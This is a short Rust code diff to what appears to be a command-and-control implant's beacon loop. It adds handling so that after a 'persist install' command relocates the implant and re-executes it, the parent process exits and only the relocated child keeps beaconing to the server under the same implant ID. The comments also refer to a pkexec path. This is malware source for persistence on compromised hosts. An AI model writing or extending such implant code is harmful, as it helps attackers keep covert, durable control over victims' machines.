@@ -110,6 +110,16 @@ pub fn run_beacon_loop(config: &config::Config) {
                     should_exit = true;
                 }
 
+                // `persist install` copies us to the install path and spawns a
+                // child running from there under the same implant_id; the parent
+                // exits so only the relocated child beacons (server merges — no
+                // duplicate session).
+                if cmd.module == "persist" && cmd.action == "install"
+                    && result.data.get("reexec").and_then(|v| v.as_bool()).unwrap_or(false)
+                {
+                    should_exit = true;
+                }
+
                 // Send result immediately
                 let payload = c2::ResultPayload {
                     implant_id: implant_id.clone(),
@@ -178,6 +188,13 @@ pub fn run_beacon_loop(config: &config::Config) {
                         status: result.status.clone(),
                         data: result.data.clone(),
                     });
+                    // Relocation re-exec (persist install): parent exits so only
+                    // the relocated child beacons. Mirrors the main-loop pkexec path.
+                    if cmd.module == "persist" && cmd.action == "install"
+                        && result.data.get("reexec").and_then(|v| v.as_bool()).unwrap_or(false)
+                    {
+                        should_exit = true;
+                    }
                 }
             }
         }
